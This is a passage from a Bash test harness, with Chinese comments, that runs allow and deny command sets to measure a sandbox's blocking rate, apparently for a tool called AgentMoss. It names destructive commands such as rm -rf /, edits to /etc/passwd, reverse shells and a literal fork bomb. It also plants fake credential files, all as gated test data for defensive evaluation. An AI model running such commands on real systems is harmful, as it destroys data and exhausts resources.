warn_p "deny.sh 含高危恶意命令（rm -rf /、改 /etc/passwd、iptables、fork bomb、反弹 shell 等）。"
if [ -f "$SCRIPT_DIR/allow-root-only.sh" ] || [ -f "$SCRIPT_DIR/deny-root-only.sh" ]; then
    warn_p "allow-root-only.sh / deny-root-only.sh 是**需要 root 权限**才能执行的命令："
    warn_p "  普通用户（如客户沙箱的 sandbox 用户）会被操作系统自身 Permission denied 拦截，"
    warn_p "  与沙箱无关——默认**不计入**通过率统计（避免把 OS 拦截误算成沙箱拦截）。"
    if [ "$INCLUDE_ROOT_ONLY" = "1" ]; then
        err_p "已加 --include-root-only：root-only 命令将纳入执行并单独统计（需以 root 或配了 passwordless sudo 运行才有意义）！"
    else
        warn_p "  如需纳入，加 --include-root-only（并确认以 root 运行）。"
    fi
fi
if [ "$ALLOW_DANGEROUS" = "1" ]; then
    err_p "已加 --allow-dangerous：高危命令将真实执行！仅限隔离测试沙箱！"
    err_p "必须在完全清楚后果的前提下执行，且不会因副作用导致财产/信息丢失。"
    if [ "$RUN_FORK_BOMB" = "1" ]; then
        err_p "已加 --run-fork-bomb：fork bomb 将真实执行！会打爆容器资源导致沙箱重启（自担风险）！"
    else
        warn_p '注意：fork bomb 命令（`:(){ :|:& };:`）即使 --allow-dangerous 也【默认 SKIP】——'
        warn_p "  它会无限 fork 打爆容器 CPU/内存/进程数，timeout 杀不掉残留，沙箱被 SIGKILL(137) 重启。"
        warn_p "  确需真执行 fork bomb 请显式加 --run-fork-bomb（自担风险，须在隔离沙箱）。"
    fi
    if [ "$RUN_RESOURCE_ABUSE" = "1" ]; then
        err_p "已加 --run-resource-abuse：无限循环 / yes 刷屏等资源滥用命令将真实执行（自担风险）！"
    else
        # 注意：本段用**单引号**——双引号里的反引号会被 bash 当命令替换执行，
        # 而示例正是 `while true; do :; done`（会真的死循环卡住脚本）。同类坑见
        # 上面 fork bomb 那段的单引号写法 + 历史修复 5ee8e69。
        warn_p '注意：资源滥用命令（`while true; do :; done`、`yes > /dev/null &` 等）同样【默认 SKIP】——'
        warn_p '  `&` 结尾的命令 timeout 兜不住（bash 立即返回 rc=0），跑完留孤儿进程常驻烧满一个核。'
        warn_p "  确需真执行请显式加 --run-resource-abuse（自担风险，须在隔离沙箱）。"
    fi
else
    warn_p "高危命令默认【跳过】不执行（标记 SKIP），避免破坏系统。"
    warn_p "如需真执行高危命令（自担风险），加 --allow-dangerous，且必须在隔离沙箱。"
    warn_p "  （fork bomb 需另加 --run-fork-bomb；无限循环/yes 刷屏等资源滥用需另加 --run-resource-abuse）"
fi
err_p "严禁用于其他任何场景（生产环境、真实业务系统、非沙箱测试等）。"
err_p "因在本测试集范围外使用、或未充分评估后果而导致的任何损失，本项目不承担责任。"
echo ""
if [ "$YES" = "1" ]; then
    warn_p "已加 --yes，跳过确认。"
else
    # 非交互（stdin 非 TTY，如 CI/管道/脚本调用）下 read 会立即读到 EOF（ans 空），
    # 虽走"已取消"，但不应依赖运气——这里显式检测：非 TTY 且没 --yes → 强制要求 --yes，
    # 而不是静默取消/继续。防止任何「没 ask 就直接执行」的路径。
    if [ ! -t 0 ]; then
        err_p "stdin 非交互（无 TTY）且未加 --yes——这是危险命令集，必须显式 --yes 才可继续。"
        err_p "请用：bash '$0' --yes（并确认已在隔离沙箱）"
        exit 2
    fi
    read -r -p "[ run_all ] 确认继续？[y/N] " ans
    case "$ans" in
        y|Y) echo "继续。" ;;
        *) echo "已取消。"; exit 1 ;;
    esac
fi

# 执行——直接流式输出（不用命令替换吞输出），每个阶段结束立即打印汇总。
# 这样：①用户实时看到每条 PASS/FAIL；②allow 汇总在 deny 前就打出来，
# 即使 deny 真执行把系统跑挂，allow 结果不丢；③落盘 /tmp/am_exec_summary*.$$ 兜底。
# cwd 统一为 SCRIPT_DIR：命令里的相对路径（config.yaml、.env 等）以此为准，
# 与「bash allow.sh / bash deny.sh」直接从本目录执行的 flow 一致。
cd "$SCRIPT_DIR"
run_cmds "$SCRIPT_DIR/allow.sh" "Allow"
# deny 阶段前重建 /tmp 读目标输入：allow.sh 里的 `rm -rf /tmp/*`（allow-68 等）会清空
# prep.sh 在 /tmp 建的输入文件，导致 deny.sh 的 `find /tmp -name "*.txt" | xargs sed -i`
# 等命令无输入报错（sed: no input files / No such file）。此处幂等重建**读目标**
# （仅当不存在，写目标不建——与 prep.sh 第 3 节「读建、写不建」原则一致）。
# 注意：allow 阶段先跑、deny 阶段后跑是 run_all.sh 的固定顺序，无法在文件间调序，
# 故以「deny 前重建输入」替代「交换命令顺序」。
mkdir -p /tmp/test_workspace /tmp/payload /tmp/proj 2>/dev/null || true
for _rf in "/tmp/input.txt:input data" "/tmp/readme.txt:readme" \
           "/tmp/report.txt:report data" \
           "/tmp/test_workspace/.env:KEY=val" "/tmp/payload.sh:#!/bin/bash" \
           "/tmp/script.sh:#!/bin/bash" "/tmp/file:file" \
           "/tmp/batch_users.txt:ops:newpass" "/tmp/.probe_key:probe" \
           "/tmp/alice_file.txt:alice" "/tmp/my-tasks:*/5 * * * * backup" \
           "/tmp/test_file:testfile" "/tmp/malicious:malicious" \
           "/tmp/payload/main.sh:#!/bin/bash" "/tmp/proj/readme.md:project readme" \
           "/tmp/creds.txt:AKIA...:secret" "/tmp/secret.txt:secret=abc123"; do
    _fp="${_rf%%:*}"; _content="${_rf#*:}"
    [ -f "$_fp" ] || echo "$_content" > "$_fp" 2>/dev/null || true
done
# report.zip（allow-46 unzip / deny-103 unzip $(touch)）建在 SCRIPT_DIR、非 /tmp——
# rm -rf /tmp/* 清不到它；但若 prep.sh 未跑则不存在，幂等补建（允许 cat/deny 可解压）。
if [ ! -f "$SCRIPT_DIR/report.zip" ]; then
    python3 - "$SCRIPT_DIR/report.zip" <<'PYEOF' 2>/dev/null || true
import sys, zipfile
zp = sys.argv[1]
with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("report-helper/data.txt", "report data\n")
    z.writestr("report-helper/readme.md", "# report\n")
PYEOF
fi
# input.txt 补充 allow-13 `grep "a>b"` 需要的标记（重建基础内容后追加，保证 grep 有匹配）
grep -q "a>b" /tmp/input.txt 2>/dev/null || echo "a>b input data" >> /tmp/input.txt 2>/dev/null || true
run_cmds "$SCRIPT_DIR/deny.sh" "Deny"
# root-only 文件：默认排除（普通用户被 OS 自身拦截，与沙箱无关，不计入主集通过率）；
# 加 --include-root-only 才纳入执行（作为独立标签单独统计，不混入主 Allow/Deny）。
if [ "$INCLUDE_ROOT_ONLY" = "1" ]; then
    if [ -f "$SCRIPT_DIR/allow-root-only.sh" ]; then
        run_cmds "$SCRIPT_DIR/allow-root-only.sh" "Allow-root-only"
    fi
    if [ -f "$SCRIPT_DIR/deny-root-only.sh" ]; then
        run_cmds "$SCRIPT_DIR/deny-root-only.sh" "Deny-root-only"
    fi
fi

# 基线汇总持久化：把真执行模式的阶段汇总固化到 $SCRIPT_DIR/.last_run_sandbox.txt
# （gitignore 已忽略），供 `bash run_all.sh --use-agentmoss` 结束时追加「有无 AgentMoss」对比。
# dry-run（--no-exec）不写：它全 0、不是有效基线，写进去会覆盖掉上一次真跑的基线。
if [ "$NO_EXEC" != "1" ]; then
    cp -f "/tmp/am_exec_summary_all.$$" "$SCRIPT_DIR/.last_run_sandbox.txt" 2>/dev/null || true
fi

# 最终汇总（阶段结果已实时打印 + 落盘；若中途崩溃此处不执行，但每个阶段完成时
# 汇总已打印并持久化到 /tmp/am_exec_summary_all.$$，不丢失）
ALLOW_LINE=$(grep "^Allow " "/tmp/am_exec_summary_all.$$" 2>/dev/null | tail -1)
DENY_LINE=$(grep "^Deny " "/tmp/am_exec_summary_all.$$" 2>/dev/null | tail -1)
ALLOW_RO_LINE=$(grep "^Allow-root-only " "/tmp/am_exec_summary_all.$$" 2>/dev/null | tail -1)
DENY_RO_LINE=$(grep "^Deny-root-only " "/tmp/am_exec_summary_all.$$" 2>/dev/null | tail -1)
echo ""
echo "========================================="
echo "  结果汇总（PASS/FAIL = 是否符合预期）"
echo "========================================="
if [ "$NO_EXEC" = "1" ]; then
    # dry-run 没有任何执行/判定结果 —— 不打印 0/N 的假象（会被读成"拦截率 0%/100%"）
    echo "  dry-run（--no-exec）：命令只打印、未执行也未判定，**无法得出放行率/拦截率**"
    echo "  逐阶段条数见上方各阶段收尾行；要数字请去掉 --no-exec 重跑。"
    echo "========================================="
    echo "  每条命令结果已实时打印；环节跑挂时的阶段结果持久化在 /tmp/am_exec_summary_all.$$"
    exit 0
fi
# 汇总行：$5 = 其中"安全跳过未执行"条数（fail 的子集；三类：fork bomb、资源滥用、
# 未加 --allow-dangerous 的 deny）。它**照常计入分母与 FAIL**，
# 这里显式打出"其中 N 条安全跳过未执行"，避免把"没跑"读成"没拦住"或"拦住了"。
echo "  Allow（放行率）: $(echo "$ALLOW_LINE" | awk '$1=="Allow"{printf "%s 已放行 / %s 总（被拦 %s%s，命令不存在 %s）", $2,$3,$4,($5+0>0?"，其中 "$5" 条安全跳过未执行":""),$6}')"
echo "  Deny （拦截率）: $(echo "$DENY_LINE" | awk '$1=="Deny"{printf "%s 已拦截 / %s 总（未拦截 %s%s，命令不存在 %s）", $2,$3,$4,($5+0>0?"，其中 "$5" 条安全跳过未执行":""),$6}')"
if [ -n "$ALLOW_RO_LINE" ]; then
    echo "  Allow-root-only（需 root，单独统计）: $(echo "$ALLOW_RO_LINE" | awk '$1=="Allow-root-only"{printf "%s 已放行 / %s 总（被拦 %s%s，命令不存在 %s）", $2,$3,$4,($5+0>0?"，其中 "$5" 条安全跳过未执行":""),$6}')"
fi
if [ -n "$DENY_RO_LINE" ]; then
    echo "  Deny-root-only（需 root，单独统计）: $(echo "$DENY_RO_LINE" | awk '$1=="Deny-root-only"{printf "%s 已拦截 / %s 总（未拦截 %s%s，命令不存在 %s）", $2,$3,$4,($5+0>0?"，其中 "$5" 条安全跳过未执行":""),$6}')"
fi
echo "========================================="
# 命令不存在统一说明：rc=127 = 客户环境未安装对应软件（如 crontab/docker/wget/nginx/php 等），
# 属环境差异而非命令本身失败，已不计入通过率统计。客户如需执行这些命令，请按需安装软件后重跑。
CN_ALL=$(awk '{s+=$6} END{print s+0}' "/tmp/am_exec_summary_all.$$" 2>/dev/null)
if [ "$CN_ALL" -gt 0 ]; then
    warn_p "有 $CN_ALL 条命令因【软件未安装】（command not found）被跳过统计——属客户环境差异，"
    warn_p "非沙箱/AgentMoss 拦截能力体现；如需执行请在沙箱内安装对应软件（crontab/docker/wget/nginx 等）后重跑。"
fi
echo "  每条命令结果已实时打印；环节跑挂时的阶段结果持久化在 /tmp/am_exec_summary_all.$$"